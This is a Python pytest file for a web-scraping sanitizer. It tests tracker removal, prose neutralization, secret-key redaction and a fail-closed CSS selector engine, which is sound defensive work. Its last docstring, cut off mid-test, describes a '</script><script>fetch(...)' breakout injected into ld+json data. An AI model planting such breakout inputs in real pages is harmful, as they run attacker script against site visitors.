        - A surviving tracker beacon means the tracker-domain blocklist was narrowed or element removal was disabled.
    """
    html = (
        '<img src="https://www.google-analytics.com/collect?x=1">'
        '<link href="https://sub.doubleclick.net/px">'
        '<img src="https://cdn.test/cover.jpg">'
        "<span>keep</span>"
    )
    out = strip_tracking(html)
    assert "google-analytics" not in out
    assert "doubleclick" not in out
    assert "cdn.test/cover.jpg" in out
    assert "keep" in out


# --------------------------------------------------------------------------- #
# neutralize_prose
# --------------------------------------------------------------------------- #
def test_neutralize_prose_replaces_long_text_keeps_metadata() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose collapses long prose to the placeholder while preserving keep-selector text.

    Scenario:
        Given HTML with an isbn span (matched by the keep-selector) and a long description div.
        When neutralize_prose is called with the isbn selector.
        Then the isbn value survives verbatim and the long prose is replaced by PROSE_PLACEHOLDER.

    Boundaries:
        - Kept-selector matches survive intact; long text outside those matches collapses.

    On failure, first check:
        - A missing isbn value means the keep-selector protection was not applied to descendants.
    """
    long_desc = "This book covers many topics. " * 20
    html = f'<span id="isbn">978-1-0000</span><div class="about-book__content">{long_desc}</div>'
    out = neutralize_prose(html, ["#isbn"])
    assert "978-1-0000" in out
    assert long_desc.strip() not in out
    assert PROSE_PLACEHOLDER in out


def test_neutralize_prose_container_hint_neutralizes_only_long_text() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose collapses only long text in a prose container, keeping short text.

    Scenario:
        Given a short "Great read!" paragraph in a 'review' container and separately a long review body in the same
        container type.
        When neutralize_prose is called on each.
        Then the short text survives verbatim; the long text is replaced by PROSE_PLACEHOLDER.

    Boundaries:
        - Short text (<~80 chars) stays verbatim even in a prose-named container; only long text collapses.

    On failure, first check:
        - A missing short heading means the prose-container rule is neutralizing all text in prose containers.
    """
    short = neutralize_prose('<p class="review">Great read!</p>', [])
    assert "Great read!" in short
    assert PROSE_PLACEHOLDER not in short

    long_body = "Great read that I would recommend to everyone learning the topic in depth. " * 2
    long_out = neutralize_prose(f'<p class="review">{long_body}</p>', [])
    assert long_body.strip() not in long_out
    assert PROSE_PLACEHOLDER in long_out


def test_neutralize_prose_keeps_short_factual_text() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose leaves short factual text (a date) untouched.

    Scenario:
        Given a date span with a short value.
        When neutralize_prose is called with no keep-selectors.
        Then the date is preserved and PROSE_PLACEHOLDER is not introduced.

    Boundaries:
        - Short text nodes (below the prose-length threshold) are never neutralized regardless of container.

    On failure, first check:
        - A missing date means the prose-length threshold was lowered below the length of short factual text.
    """
    out = neutralize_prose('<span class="date">2024-01-01</span>', [])
    assert "2024-01-01" in out
    assert PROSE_PLACEHOLDER not in out


def test_neutralize_prose_protects_descendant_text() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose preserves long text inside a matched keep-selector descendant.

    Scenario:
        Given a div matched by '#keep' containing a paragraph with 300 chars of text.
        When neutralize_prose is called with the '#keep' selector.
        Then the long text inside the matched descendant is preserved verbatim.

    Boundaries:
        - Keep-selector protection extends to all descendants; length threshold does not override it.

    On failure, first check:
        - Missing descendant text means the keep-selector protection does not cascade to descendants.
    """
    long_text = "b" * 300
    html = f'<div id="keep"><p>{long_text}</p></div>'
    out = neutralize_prose(html, ["#keep"])
    assert long_text in out


# --------------------------------------------------------------------------- #
# sanitize_json edge cases
# --------------------------------------------------------------------------- #
def test_sanitize_json_prose_key_short_value_recurses() -> None:
    """
    [Unit] sanitize: verifies sanitize_json cleans a short prose-keyed value rather than replacing it with a placeholder.

    Scenario:
        Given a dict with key 'description' and a short value containing an email address.
        When sanitize_json is called.
        Then the email is replaced by EMAIL_PLACEHOLDER, not PROSE_PLACEHOLDER (the value was too short to collapse).

    Boundaries:
        - Prose keys only collapse to PROSE_PLACEHOLDER when the value is long; short values are cleaned in place.

    On failure, first check:
        - A PROSE_PLACEHOLDER result means the prose-key length threshold was removed or lowered to zero.
    """
    out = sanitize_json({"description": "email me at a@corp-real.com"})
    assert EMAIL_PLACEHOLDER in out["description"]
    assert out["description"] != PROSE_PLACEHOLDER


def test_sanitize_json_handles_lists_and_non_string_keys() -> None:
    """
    [Unit] sanitize: verifies sanitize_json recurses into lists and ignores non-string dict keys for redaction.

    Scenario:
        Given a dict with an integer key mapping to a list of an email, an integer, and None.
        When sanitize_json is called.
        Then the email in the list is replaced by EMAIL_PLACEHOLDER; the integer and None are unchanged.

    Boundaries:
        - Non-string dict keys are never matched against the sensitive-key patterns; lists recurse element-wise.

    On failure, first check:
        - An unmodified email means list recursion was broken; a missing integer means non-string values are being redacted.
    """
    out = sanitize_json({1: ["a@corp-real.com", 7, None]})
    assert out[1][0] == EMAIL_PLACEHOLDER
    assert out[1][1] == 7
    assert out[1][2] is None


def test_sanitize_json_key_redaction_is_segment_based() -> None:
    """
    [Unit] sanitize: verifies sanitize_json redacts only segment-matched sensitive keys, not arbitrary substrings.

    Scenario:
        Given dicts with sensitive keys (authToken, auth_token, sessionId, api_key, X-CSRF-Token, authorization)
        and benign keys (accepted_authors, author, authors, sidebar, id, value).
        When sanitize_json is called on each.
        Then sensitive keys are REDACTED_VALUE; benign keys are unchanged.

    Boundaries:
        - Keys are matched by segment (e.g. 'auth' as a whole segment), not as a substring of any key name.

    On failure, first check:
        - A redacted benign key (e.g. accepted_authors) means the segment-matching rule was replaced with substring.
    """
    tok = "z" * 24
    for sensitive in ("authToken", "auth_token", "sessionId", "api_key", "X-CSRF-Token", "authorization"):
        assert sanitize_json({sensitive: tok})[sensitive] == REDACTED_VALUE
    for benign in ("accepted_authors", "author", "authors", "sidebar", "id", "value"):
        assert sanitize_json({benign: "keep-this-value"})[benign] == "keep-this-value"


def test_sanitize_json_preserves_leanpub_accepted_authors_shape() -> None:
    """
    [Unit] sanitize: verifies sanitize_json preserves the Leanpub accepted_authors relationship structure intact.

    Scenario:
        Given a Leanpub JSON:API payload with data.relationships.accepted_authors.data and an included author object.
        When sanitize_json is called.
        Then the entire payload is returned unchanged (all keys and values survive).

    Boundaries:
        - The whole nested object round-trips unchanged; no key in this structure should trigger redaction.

    On failure, first check:
        - A redacted or missing value means segment-matching still catches a Leanpub field name; the scrape will crash.
    """
    payload = {
        "data": {
            "id": "book-1",
            "attributes": {"title": "Fluent Python", "slug": "fluentpython"},
            "relationships": {"accepted_authors": {"data": [{"id": "a1", "type": "Author"}]}},
        },
        "included": [{"id": "a1", "type": "Author", "attributes": {"name": "Luciano Ramalho"}}],
    }
    assert sanitize_json(payload) == payload


def test_sanitize_json_depth_cap_returns_value() -> None:
    """
    [Unit] sanitize: verifies sanitize_json returns the sub-value as-is when recursion exceeds the depth cap (FIX-11).

    Scenario:
        Given a deeply nested list structure exceeding MAX_JSON_DEPTH + 5 levels.
        When sanitize_json is called.
        Then no RecursionError is raised and the top-level result is a list.

    Boundaries:
        - FIX-11 (DoS bound): sanitize_json stops recursing at MAX_JSON_DEPTH and returns the remaining sub-value.

    On failure, first check:
        - A RecursionError means the depth cap was removed; a TypeError means the return type contract changed.
    """
    nested: object = "leaf"
    for _ in range(sanitize.MAX_JSON_DEPTH + 5):
        nested = [nested]
    # Should not raise RecursionError.
    result = sanitize_json(nested)
    assert isinstance(result, list)


# --------------------------------------------------------------------------- #
# DOM parser / serializer internals
# --------------------------------------------------------------------------- #
def test_parse_roundtrips_doctype_void_and_boolean_attrs() -> None:
    """
    [Unit] sanitize: verifies _parse/_serialize roundtrips DOCTYPE, void elements, and boolean attributes.

    Scenario:
        Given HTML with DOCTYPE, an input with disabled, a br, and entity-encoded text.
        When _parse then _serialize are called.
        Then DOCTYPE is present, the input and disabled attr survive, br is self-closing, and entities are preserved.

    Boundaries:
        - Covers DOCTYPE declaration, void elements (br, input), valueless boolean attrs, and HTML entity text.

    On failure, first check:
        - A missing DOCTYPE or disabled attr means the parser/serializer dropped a node or attribute type.
    """
    html = "<!DOCTYPE html><input type=text disabled><br><p>hi &amp; bye</p>"
    out = _serialize(_parse(html))
    assert out.startswith("<!DOCTYPE html>")
    assert "<input" in out
    assert " disabled" in out
    assert "<br>" in out
    assert "hi &amp; bye" in out


def test_parse_bounds_depth_without_error() -> None:
    """
    [Unit] sanitize: verifies _parse/_serialize handles a document deeper than MAX_TREE_DEPTH without a stack overflow.

    Scenario:
        Given an HTML string with MAX_TREE_DEPTH + 50 levels of nested divs containing a leaf text node.
        When _parse then _serialize are called.
        Then the leaf text survives and no RecursionError is raised.

    Boundaries:
        - The depth cap prevents unbounded recursion; the leaf text confirms the structure was parsed at all.

    On failure, first check:
        - A RecursionError means the tree-depth cap was removed or set too high.
    """
    depth = sanitize.MAX_TREE_DEPTH + 50
    html = "<div>" * depth + "leaf" + "</div>" * depth
    out = _serialize(_parse(html))
    assert "leaf" in out


def test_parse_ignores_unmatched_end_tag() -> None:
    """
    [Unit] sanitize: verifies _parse ignores a stray closing tag with nothing open.

    Scenario:
        Given HTML starting with a stray </div> followed by a valid <p>x</p>.
        When _parse then _serialize are called.
        Then the valid paragraph appears in the output and no error is raised.

    Boundaries:
        - Stray closing tags are silently ignored; the parser does not abort on unmatched end tags.

    On failure, first check:
        - A raised exception means the parser became stricter and now rejects unmatched end tags.
    """
    out = _serialize(_parse("</div><p>x</p>"))
    assert "<p>x</p>" in out


def test_serialize_rawtext_skips_non_text_children() -> None:
    """
    [Unit] sanitize: verifies _serialize emits only text children of a rawtext element, skipping element children.

    Scenario:
        Given a style element with a text child containing CSS and an element child (span).
        When _serialize is called on the style element.
        Then the output contains the CSS text verbatim and no span element.

    Boundaries:
        - Rawtext elements (style, script) serialize text children only; element children are silently dropped.

    On failure, first check:
        - A span appearing in the output means the rawtext serialization path is no longer skipping element children.
    """
    style = _Element("style", [])
    style.children = [_Text(".a > .b {}"), _Element("span", [])]
    out = _serialize(style)
    assert out == "<style>.a > .b {}</style>"


# --------------------------------------------------------------------------- #
# selector splitting / selecting
# --------------------------------------------------------------------------- #
def test_split_group_handles_combinators_and_valid_pseudo() -> None:
    """
    [Unit] sanitize: verifies _split_group tokenizes all CSS combinators and a valid :has-text() compound.

    Scenario:
        Given a complex selector string with >, +, ~, and :has-text() pseudo-class.
        When _split_group is called.
        Then the returned combinator list includes '>', '+', and '~'.

    Boundaries:
        - Covers child, adjacent-sibling, general-sibling combinators, and compound pseudo-classes.

    On failure, first check:
        - A missing combinator means the tokenizer was narrowed and complex selectors will fail.
    """
    pairs = _split_group("div > .a + span ~ b em[data-x='y']:has-text('Z')")
    combinators = [combinator for combinator, _ in pairs]
    assert ">" in combinators and "+" in combinators and "~" in combinators


def test_split_group_fails_closed_on_unterminated_syntax() -> None:
    """
    [Unit] sanitize: verifies _split_group raises on unterminated bracket or paren syntax (FIX: over-match).

    Scenario:
        Given a selector with an unterminated attribute bracket '[attr' and separately one with an unterminated paren.
        When _split_group is called on each.
        Then SanitizationError is raised for both.

    Boundaries:
        - Unterminated syntax always raises; it never silently widens to match everything.

    On failure, first check:
        - A passing call means the over-match fix was reverted and malformed selectors now match too broadly.
    """
    with pytest.raises(SanitizationError):
        _split_group("[attr")
    with pytest.raises(SanitizationError):
        _split_group("a:has(")


def test_selector_combinators_and_attributes() -> None:
    """
    [Unit] sanitize: verifies _select resolves child, sibling, descendant, and attribute selectors correctly.

    Scenario:
        Given a small HTML tree with section, h1, and two p elements with classes and a data-role attribute.
        When _select is called with each combinator and attribute selector form.
        Then each returns the correct element(s); a group with an invalid part is skipped without error.

    Boundaries:
        - Covers '>', '+', '~', descendant, [attr=val], and [attr] presence selectors.

    On failure, first check:
        - A wrong result means a combinator or attribute rule in _select was changed; check the failing selector first.
    """

    html = '<section id="s"><h1 class="a">A</h1><p class="b" data-role="lead">B</p><p class="c">C</p></section>'
    root = _parse(html)
    assert [e.tag for e in _select(root, "#s > .a")] == ["h1"]
    assert [e.tag for e in _select(root, ".a + .b")] == ["p"]
    assert [e.tag for e in _select(root, ".a ~ .c")] == ["p"]
    assert [e.tag for e in _select(root, "section .c")] == ["p"]
    assert [e.tag for e in _select(root, "p[data-role=lead]")] == ["p"]
    assert [e.tag for e in _select(root, "p[data-role]")] == ["p"]
    # A group that reduces to no compound is skipped, not an error.
    assert _select(root, "section, >") == _select(root, "section")


def test_selector_star_and_attribute_value_mismatch() -> None:
    """
    [Unit] sanitize: verifies _select handles the universal selector and returns nothing on attribute value mismatch.

    Scenario:
        Given a div containing a p with data-role="lead".
        When _select is called with '*' (universal) and with 'p[data-role=other]' (wrong value).
        Then '*' matches the p element; the wrong-value selector returns an empty list.

    Boundaries:
        - Universal selector matches all elements; exact attribute value equality is required.

    On failure, first check:
        - An unexpected empty result for '*' means the universal selector was accidentally disabled.
    """

    root = _parse('<div><p data-role="lead">x</p></div>')
    assert any(e.tag == "p" for e in _select(root, "*"))
    assert _select(root, "p[data-role=other]") == []


def test_element_siblings_orphan_returns_self() -> None:
    """
    [Unit] sanitize: verifies _element_siblings returns the element itself when it has no parent.

    Scenario:
        Given a p element with no parent.
        When _element_siblings is called.
        Then a list containing only that element is returned.

    Boundaries:
        - Orphan elements have exactly one sibling: themselves.

    On failure, first check:
        - An empty list or an exception means the orphan path in _element_siblings was broken.
    """

    orphan = _Element("p", [])
    assert _element_siblings(orphan) == [orphan]


def test_select_skips_empty_group() -> None:
    """
    [Unit] sanitize: verifies _select skips a trailing empty selector group without raising.

    Scenario:
        Given a selector string ending with a comma ('p,'), producing a trailing empty group.
        When _select is called.
        Then the valid 'p' group matches its element and no error is raised.

    Boundaries:
        - Trailing empty groups are silently skipped; valid preceding groups still resolve.

    On failure, first check:
        - A raised exception means _select became stricter about trailing commas.
    """

    root = _parse("<section><p>x</p></section>")
    assert [e.tag for e in _select(root, "p,")] == ["p"]


def test_startendtag_self_closing_element_roundtrips() -> None:
    """
    [Unit] sanitize: verifies _parse/_serialize roundtrips an XHTML-style self-closing custom element.

    Scenario:
        Given HTML with an XHTML self-closing custom tag '<widget/>' followed by a '<p>ok</p>'.
        When _parse then _serialize are called.
        Then the output contains a <widget> element and the <p>ok</p> paragraph.

    Boundaries:
        - XHTML self-closing syntax is accepted and re-emitted as a standard open tag.

    On failure, first check:
        - A missing widget or p means the parser mishandled the self-closing or following element.
    """
    out = _serialize(_parse("<widget/><p>ok</p>"))
    assert "<widget>" in out
    assert "<p>ok</p>" in out


def test_strip_secrets_blanks_hidden_input_without_value_attr() -> None:
    """
    [Unit] sanitize: verifies strip_secrets adds a blank value attribute to a hidden input that has none.

    Scenario:
        Given a hidden input element with no value attribute.
        When strip_secrets is called.
        Then the output contains value="" on the input element.

    Boundaries:
        - The append path: hidden inputs without a value attribute get one added as blank.

    On failure, first check:
        - A missing value="" means the hidden-input branch that appends rather than replaces was broken.
    """
    out = strip_secrets('<input type="hidden" name="a">')
    assert 'value=""' in out


def test_strip_tracking_skips_valueless_attribute() -> None:
    """
    [Unit] sanitize: verifies strip_tracking leaves valueless boolean attributes untouched while cleaning URLs.

    Scenario:
        Given an anchor with a valueless 'download' attribute, a tracking 'ref=abc' param, and a benign 'keep=1' param.
        When strip_tracking is called.
        Then 'download' survives, 'ref=abc' is removed, and 'keep=1' survives.

    Boundaries:
        - Valueless attributes have no URL to clean; only value-bearing URL attributes are processed.

    On failure, first check:
        - A missing 'download' attr means strip_tracking is incorrectly treating valueless attrs as URLs.
    """
    out = strip_tracking('<a download href="https://x.test/p?ref=abc&keep=1">L</a>')
    assert " download" in out
    assert "ref=abc" not in out
    assert "keep=1" in out


def test_strip_srcset_skips_empty_candidate() -> None:
    """
    [Unit] sanitize: verifies strip_tracking skips an empty srcset candidate caused by a double comma.

    Scenario:
        Given an img srcset with two valid candidates separated by a double comma.
        When strip_tracking is called.
        Then both valid candidates survive and no error is raised.

    Boundaries:
        - Double commas produce empty candidate strings; these are silently skipped.

    On failure, first check:
        - A raised exception means the srcset parser does not handle empty candidates.
    """
    out = strip_tracking('<img srcset="https://cdn.test/a.jpg 1x,,https://cdn.test/b.jpg 2x">')
    assert "a.jpg" in out
    assert "b.jpg" in out


def test_neutralize_prose_skips_whitespace_text_nodes() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose leaves whitespace-only text nodes untouched.

    Scenario:
        Given a div with a single space before a span containing '2024'.
        When neutralize_prose is called with no keep-selectors.
        Then the '2024' text is preserved and no placeholder is introduced.

    Boundaries:
        - Whitespace-only text nodes are never counted as prose and are never neutralized.

    On failure, first check:
        - A missing '2024' means whitespace nodes are being misclassified as prose and triggering neutralization.
    """
    out = neutralize_prose("<div> <span>2024</span></div>", [])
    assert "2024" in out


def test_selector_no_match_paths() -> None:
    """
    [Unit] sanitize: verifies _select returns an empty list when an adjacent selector has no predecessor or ancestor is missing.

    Scenario:
        Given a div containing a single p.first element.
        When _select is called with '.x + .first' (no matching predecessor), '.missing .first' (absent ancestor),
        and 'span > .first' (wrong parent type).
        Then all three return an empty list.

    Boundaries:
        - No-match results are always empty lists, never errors.

    On failure, first check:
        - A non-empty result means a selector that should not match is now matching spuriously.
    """

    root = _parse('<div><p class="first">P</p></div>')
    # ".x + .first" : .first has no preceding sibling matching .x
    assert _select(root, ".x + .first") == []
    # descendant with a non-existent ancestor
    assert _select(root, ".missing .first") == []
    # child selector whose target has no matching parent
    assert _select(root, "span > .first") == []


# --------------------------------------------------------------------------- #
# :has-text() semantics + fail-closed engine (over-match fix)
# --------------------------------------------------------------------------- #
def _selector_values() -> list[tuple[str, str, str]]:
    """Return every real CSS selector in site_constants as (site, field, selector) tuples."""

    out: list[tuple[str, str, str]] = []
    for site, entry in site_constants.items():
        for field, value in entry.items():
            if not isinstance(value, str) or not value:
                continue
            if "URL" in field or "API" in field or field == "404_PAGE_TITLE":
                continue
            out.append((site, field, value))
    return out


def test_all_site_constants_selectors_parse() -> None:
    """
    [Unit] sanitize: verifies all site_constants selectors parse without raising against an empty document.

    Scenario:
        Given every CSS selector from all four sites in site_constants.
        When _select is called with each against an empty document.
        Then no selector raises and all values are strings.

    Boundaries:
        - Parse only (no match expected); any raised error means the sanitizer's engine is incompatible with a selector.

    On failure, first check:
        - The raised selector is printed via the assert; find which site.field it belongs to and check for new syntax.
    """

    root = _parse("<html><body></body></html>")
    for site, field, selector in _selector_values():
        # Must not raise.
        _select(root, selector)
        assert isinstance(selector, str), f"{site}.{field}"


def test_has_text_disambiguates_packtpub_isbn() -> None:
    """
    [Unit] sanitize: verifies the packtpub ISBN-13 selector returns only the ISBN-13 value via :has-text (FIX: over-match).

    Scenario:
        Given packtpub-shaped HTML with both an ISBN-10 row and an ISBN-13 row.
        When _select is called with the packtpub ISBN13 selector.
        Then only the ISBN-13 value span is returned.

    Boundaries:
        - :has-text() disambiguation prevents the ISBN-10 row from also matching.

    On failure, first check:
        - Multiple results mean the :has-text() clause was removed or changed in the packtpub ISBN13 selector.
    """

    html = (
        '<div class="product-page-rhs desktop">'
        '<span class="product-details-section-key">ISBN-10 :</span>'
        '<span class="product-details-section-value">1234567890</span>'
        '<span class="product-details-section-key">ISBN-13 :</span>'
        '<span class="product-details-section-value">9781234567890</span>'
        "</div>"
    )
    matches = _select(_parse(html), site_constants["packtpub"]["ISBN13"])
    assert [_text_content(m) for m in matches] == ["9781234567890"]


def test_has_text_disambiguates_oreilly_isbn() -> None:
    """
    [Unit] sanitize: verifies the oreilly ISBN-13 selector returns only the ISBN span via :has-text (FIX: over-match).

    Scenario:
        Given oreilly-shaped HTML with a publisher span and an ISBN span sharing the same class.
        When _select is called with the oreilly ISBN13 selector.
        Then only the ISBN span is returned.

    Boundaries:
        - :has-text('ISBN:') on the parent li disambiguates from the publisher row sharing the same value class.

    On failure, first check:
        - Multiple results mean the :has-text() clause was removed or changed in the oreilly ISBN13 selector.
    """

    html = (
        "<ul>"
        '<li>Publisher: <span class="value t-isbn">OReilly</span></li>'
        '<li>ISBN: <span class="value t-isbn">9780123456789</span></li>'
        "</ul>"
    )
    matches = _select(_parse(html), site_constants["oreilly"]["ISBN13"])
    assert [_text_content(m) for m in matches] == ["9780123456789"]


def test_has_text_scopes_amazon_expander_group() -> None:
    """
    [Unit] sanitize: verifies the amazon DETAILS_BUTTON selector matches only the named expander headers (FIX: over-match).

    Scenario:
        Given three expander headers: 'Product details', 'Reviews', and 'Product information'.
        When _select is called with the amazon DETAILS_BUTTON selector.
        Then only 'Product details' and 'Product information' are matched; 'Reviews' is not.

    Boundaries:
        - :has-text() clauses scope the selector to the exact header names; other expander headers are excluded.

    On failure, first check:
        - 'Reviews' appearing in results means a :has-text() clause was widened or removed.
    """

    html = (
        '<a class="a-expander-header">Product details</a>'
        '<a class="a-expander-header">Reviews</a>'
        '<a class="a-expander-header">Product information</a>'
    )
    matches = _select(_parse(html), site_constants["amazon"]["DETAILS_BUTTON"])
    texts = {_text_content(m) for m in matches}
    assert texts == {"Product details", "Product information"}
    assert "Reviews" not in texts


def test_has_text_is_case_insensitive() -> None:
    """
    [Unit] sanitize: verifies :has-text() matches case-insensitively on normalized text content.

    Scenario:
        Given an anchor element with 'PRODUCT DETAILS' text and a :has-text('product details') selector.
        When _select is called.
        Then the element is matched (1 result).

    Boundaries:
        - :has-text() comparison is case-insensitive; upper and lower case text are treated equally.

    On failure, first check:
        - An empty result means :has-text() was changed to case-sensitive comparison.
    """

    root = _parse("<a>PRODUCT DETAILS</a>")
    assert len(_select(root, "a:has-text('product details')")) == 1


def test_unknown_pseudo_class_raises() -> None:
    """
    [Unit] sanitize: verifies _select raises SanitizationError on an unsupported pseudo-class (FIX: fail-closed).

    Scenario:
        Given a selector using the unsupported :nth-last-of-type(2) pseudo-class.
        When _select is called.
        Then SanitizationError is raised.

    Boundaries:
        - Unsupported pseudo-classes always raise; they are never silently ignored or treated as no-op.

    On failure, first check:
        - A passing call means a pseudo-class was added to the supported set without test coverage.
    """

    root = _parse("<div></div>")
    with pytest.raises(SanitizationError):
        _select(root, "div:nth-last-of-type(2)")


def test_pseudo_element_raises() -> None:
    """
    [Unit] sanitize: verifies _select raises SanitizationError on a pseudo-element (FIX: fail-closed).

    Scenario:
        Given a selector using the ::before pseudo-element.
        When _select is called.
        Then SanitizationError is raised.

    Boundaries:
        - Pseudo-elements (::before, ::after, etc.) are out of scope and always raise.

    On failure, first check:
        - A passing call means pseudo-element handling was silently added and the fail-closed contract was broken.
    """

    with pytest.raises(SanitizationError):
        _select(_parse("<p></p>"), "p::before")


def test_has_text_without_parens_raises() -> None:
    """
    [Unit] sanitize: verifies _select raises SanitizationError when :has-text has no argument list (FIX: fail-closed).

    Scenario:
        Given a selector using ':has-text' with no following parentheses.
        When _select is called.
        Then SanitizationError is raised.

    Boundaries:
        - :has-text without parentheses is syntactically invalid and always raises.

    On failure, first check:
        - A passing call means the :has-text parser was made more permissive about missing parentheses.
    """

    with pytest.raises(SanitizationError):
        _select(_parse("<span></span>"), "span:has-text")


def test_has_text_unterminated_raises() -> None:
    """
    [Unit] sanitize: verifies _select raises SanitizationError on an unterminated :has-text() argument (FIX: fail-closed).

    Scenario:
        Given a selector where the :has-text() closing parenthesis is missing.
        When _select is called.
        Then SanitizationError is raised.

    Boundaries:
        - Unterminated :has-text() is syntactically invalid; it always raises rather than silently matching all.

    On failure, first check:
        - A passing call means the :has-text parser was made lenient about unclosed parentheses.
    """

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a:has-text('x'")


def test_has_text_regex_form_raises() -> None:
    """
    [Unit] sanitize: verifies _select raises SanitizationError on the :has-text(/regex/) variant (FIX: fail-closed).

    Scenario:
        Given a selector using ':has-text(/x/)' with the regex argument form.
        When _select is called.
        Then SanitizationError is raised.

    Boundaries:
        - The regex :has-text() form is out of scope and always raises; only quoted-string form is supported.

    On failure, first check:
        - A passing call means the regex form was accidentally added to the supported :has-text() variants.
    """

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a:has-text(/x/)")


def test_attribute_operator_unsupported_raises() -> None:
    """
    [Unit] sanitize: verifies _select raises SanitizationError on a non-'=' attribute operator (FIX: fail-closed).

    Scenario:
        Given a selector using the '~=' (whitespace-list) attribute operator.
        When _select is called.
        Then SanitizationError is raised.

    Boundaries:
        - Only exact '=' attribute matching is supported; ~=, |=, ^=, $=, *= all raise.

    On failure, first check:
        - A passing call means an unsupported attribute operator was added without full test coverage.
    """

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a[data-x~=b]")


def test_unterminated_attribute_selector_raises() -> None:
    """
    [Unit] sanitize: verifies _split_group raises SanitizationError on an unterminated attribute selector (FIX: fail-closed).

    Scenario:
        Given a selector string '[attr' with the closing bracket missing.
        When _split_group is called.
        Then SanitizationError is raised.

    Boundaries:
        - Duplicate of the bracket-closure assertion in test_split_group_fails_closed; verifies the same path directly.

    On failure, first check:
        - A passing call means the unterminated-bracket detection in _split_group was removed.
    """
    with pytest.raises(SanitizationError):
        _split_group("[attr")


def test_unsupported_character_raises() -> None:
    """
    [Unit] sanitize: verifies _select raises SanitizationError on a stray unsupported character (FIX: fail-closed).

    Scenario:
        Given a selector with a '%' character that is not valid CSS selector syntax.
        When _select is called.
        Then SanitizationError is raised.

    Boundaries:
        - Any character outside the supported selector grammar raises; this prevents silent over-match.

    On failure, first check:
        - A passing call means the character was silently skipped, which may cause unexpected selector broadening.
    """

    with pytest.raises(SanitizationError):
        _select(_parse("<a></a>"), "a%b")


def test_neutralize_prose_neutralizes_li_not_matching_has_text() -> None:
    """
    [Unit] sanitize: verifies neutralize_prose collapses a long list item that does not match the oreilly ISBN selector.

    Scenario:
        Given a ul with a long marketing li and an ISBN li; the keep-selector is the oreilly ISBN13 selector.
        When neutralize_prose is called.
        Then the ISBN value survives and the long marketing li collapses to PROSE_PLACEHOLDER (FIX: policy).

    Boundaries:
        - The keep-selector (:has-text('ISBN:')) protects only the ISBN row; other long li elements collapse.

    On failure, first check:
        - Marketing prose surviving means the :has-text() keep-selector is over-protecting sibling elements.
    """

    long_prose = "This is a long marketing blurb about the book. " * 6
    html = f'<ul><li>{long_prose}</li><li>ISBN: <span class="value t-isbn">9780123456789</span></li></ul>'
    out = neutralize_prose(html, [site_constants["oreilly"]["ISBN13"]])
    assert "9780123456789" in out
    assert long_prose.strip() not in out
    assert PROSE_PLACEHOLDER in out


# --------------------------------------------------------------------------- #
# V-2 - JSON-shaped data-* values are parsed and sanitized
# --------------------------------------------------------------------------- #
def test_v2_sensitive_named_data_attrs_dropped() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (V-2) drops data-state/config/auth-named data-* attributes wholesale.

    Scenario:
        Given an element with data-state, data-config, data-a-state carrying opaque values, and a benign data-title.
        When strip_secrets is called.
        Then all three sensitive-named data-* attrs are gone; data-title survives.

    Boundaries:
        - V-2 [HIGH]: dropped by name regardless of value length; unrelated data-* survive.

    On failure, first check:
        - A surviving data-state/config/a-state means the V-2 name rule was narrowed.
    """
    html = (
        '<div data-state=\'{"authToken":"aQ3mZ9kLp2rX7vN4bC8dF1gH"}\' '
        'data-config=\'{"sid":"9f8e7d6c5b4a"}\' '
        'data-a-state=\'{"x":1}\' data-title="Fluent Python">x</div>'
    )
    out = strip_secrets(html)
    assert "aQ3mZ9kLp2rX7vN4bC8dF1gH" not in out
    assert "9f8e7d6c5b4a" not in out
    assert "data-state" not in out
    assert "data-config" not in out
    assert "data-a-state" not in out
    assert 'data-title="Fluent Python"' in out


def test_r2_json_data_attr_with_non_sensitive_name_is_dropped() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (R-2) drops any JSON-valued data-* attribute regardless of attribute name.

    Scenario:
        Given four element variants where a token hides in a JSON blob under data-hydration
        (nested string, bare array, generic keys, and HTML-entity-encoded JSON).
        When strip_secrets is called on each and then sanitize_html + assert_clean run on the original.
        Then data-hydration is removed in all four cases; data-title survives; assert_clean passes.

    Boundaries:
        - R-2 [MEDIUM]: any data-* with a JSON-shaped value is dropped; key-name redaction alone is insufficient.

    On failure, first check:
        - A surviving data-hydration or a failing assert_clean means the JSON-detection rule was narrowed.
    """
    tok = "aQ3mZ9kLp2rX7vN4bC8dF1gH"
    cases = [
        '<div data-hydration=\'{"inner":"{\\"apikey\\":\\"%s\\"}"}\' data-title="Fluent">x</div>' % tok,
        '<div data-hydration=\'["%s","%s"]\' data-title="Fluent">x</div>' % (tok, tok[::-1]),
        '<div data-hydration=\'{"id":"%s","value":"%s"}\' data-title="Fluent">x</div>' % (tok, tok),
        '<div data-hydration="{&quot;apikey&quot;:&quot;%s&quot;}" data-title="Fluent">x</div>' % tok,
    ]
    for html in cases:
        out = strip_secrets(html)
        assert tok not in out
        assert "data-hydration" not in out
        assert 'data-title="Fluent"' in out
        assert_clean(sanitize_html(html))


def test_r2_unparseable_json_looking_data_attr_dropped() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (R-2) drops a JSON-looking data-* attribute even when the JSON is malformed.

    Scenario:
        Given an element with data-x whose value starts with '{' but is not valid JSON, and a benign data-keep.
        When strip_secrets is called.
        Then data-x is removed and data-keep survives.

    Boundaries:
        - R-2: JSON detection is based on the value starting with '{' or '['; valid parse is not required for removal.

    On failure, first check:
        - A surviving data-x means the JSON-detection rule now requires valid JSON to trigger.
    """
    out = strip_secrets("<div data-x='{not valid json' data-keep=\"v\">x</div>")
    assert "not valid json" not in out
    assert 'data-keep="v"' in out


# --------------------------------------------------------------------------- #
# V-3 - ld+json re-embed is output-encoded (no </script> breakout)
# --------------------------------------------------------------------------- #
def test_v3_ld_json_script_breakout_is_neutralized() -> None:
    """
    [Unit] sanitize: verifies sanitize_ld_json (V-3) prevents a </script> inside JSON from breaking out of the element.

    Scenario:
        Given an ld+json blob whose name value contains '</script><script>fetch(...)' as a breakout attempt.
        When sanitize_ld_json and then sanitize_html are called.
        Then the output has exactly one ld+json script, its JSON parses to the sanitized object, and no live
        '</script><script>' sequence or attacker script is present (V-3 [HIGH]).

